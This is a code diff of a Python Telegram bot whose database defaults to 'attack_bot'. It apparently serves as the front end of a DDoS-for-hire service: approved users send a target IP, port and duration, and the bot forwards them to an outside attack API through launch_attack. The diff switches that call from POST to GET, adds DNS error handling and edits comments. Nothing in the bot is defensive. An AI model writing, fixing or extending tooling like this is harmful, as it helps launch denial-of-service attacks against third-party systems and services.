@@ -19,7 +19,6 @@ import uuid
 import os
 from dotenv import load_dotenv
 
-# Configure logging
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
@@ -48,7 +47,7 @@ def parse_admin_ids(env_value: str, default: str = "8210011971") -> list:
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 MONGODB_URI = os.getenv("MONGODB_URI")
 DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
-API_URL = os.getenv("API_URL")
+API_URL = os.getenv("API_URL")           # FULL URL including path and key
 API_KEY = os.getenv("API_KEY")
 ADMIN_IDS = parse_admin_ids(os.getenv("ADMIN_IDS", ""), "8210011971")
 
@@ -65,6 +64,7 @@ if missing:
     print(f"❌ Missing env vars: {', '.join(missing)}")
     sys.exit(1)
 
+# Ensure API_URL starts with http:// or https://
 if not API_URL.startswith(("http://", "https://")):
     API_URL = "https://" + API_URL
 
@@ -210,16 +210,31 @@ async def is_user_approved(user_id: int) -> bool:
         return False
     return True
 
-# ---------- API FUNCTIONS ----------
+# ---------- API FUNCTIONS (GET request with query parameters) ----------
 def launch_attack(ip: str, port: int, duration: int) -> Dict:
+    """Send attack request via GET with query parameters"""
     try:
-        headers = {"x-api-key": API_KEY, "Content-Type": "application/json"}
-        payload = {"ip": ip, "port": port, "duration": duration}
-        response = requests.post(API_URL, json=payload, headers=headers, timeout=15)
+        # Construct the full URL with query parameters
+        # API_URL already contains path and key, so we just append parameters
+        params = {
+            "ip": ip,
+            "port": port,
+            "duration": duration
+        }
+        headers = {"x-api-key": API_KEY}
+        # Use GET request
+        response = requests.get(API_URL, params=params, headers=headers, timeout=15)
         if response.status_code == 200:
-            return response.json()
+            # Try to parse JSON, else treat as text
+            try:
+                return response.json()
+            except:
+                return {"success": True, "message": response.text[:200]}
         else:
             return {"success": False, "error": f"HTTP {response.status_code}", "message": response.text}
+    except requests.exceptions.NameResolutionError as e:
+        logger.error(f"DNS resolution failed: {e}")
+        return {"success": False, "error": f"Domain not found: {API_URL}. Please check API_URL variable."}
     except Exception as e:
         logger.error(f"Attack error: {e}")
         return {"success": False, "error": str(e)}
@@ -236,7 +251,7 @@ def check_api_health() -> Dict:
         return {"status": "error", "error": str(e)}
 
 def check_running_attacks() -> Dict:
-    # Dummy implementation - replace if API provides
+    # Many APIs don't have /active, return dummy
     return {"success": True, "activeAttacks": [], "count": 0, "maxConcurrent": 5}
 
 # ---------- COMMAND HANDLERS ----------
@@ -319,7 +334,6 @@ async def stats_command(update, context):
 
 @admin_required
 async def blockedports_command(update, context):
-    """Admin command to show blocked ports - renamed to match pattern"""
     await update.message.reply_text(f"🚫 Blocked ports: {get_blocked_ports_list()}")
 
 # User commands
@@ -441,14 +455,13 @@ async def error_handler(update, context):
     if update and update.effective_message:
         await update.effective_message.reply_text("❌ Internal error. Check logs.")
 
-# ---------- MAIN ----------
 def main():
     if not BOT_TOKEN:
         print("❌ BOT_TOKEN missing.")
         sys.exit(1)
     app = Application.builder().token(BOT_TOKEN).build()
     
-    # Admin commands (use exact function names)
+    # Admin commands
     admin_handlers = [
         ("approve", approve_command),
         ("disapprove", disapprove_command),
@@ -456,7 +469,7 @@ def main():
         ("running", running_command),
         ("users", users_command),
         ("stats", stats_command),
-        ("blockedports", blockedports_command),   # renamed to match
+        ("blockedports", blockedports_command),
     ]
     for cmd, func in admin_handlers:
         app.add_handler(CommandHandler(cmd, func))
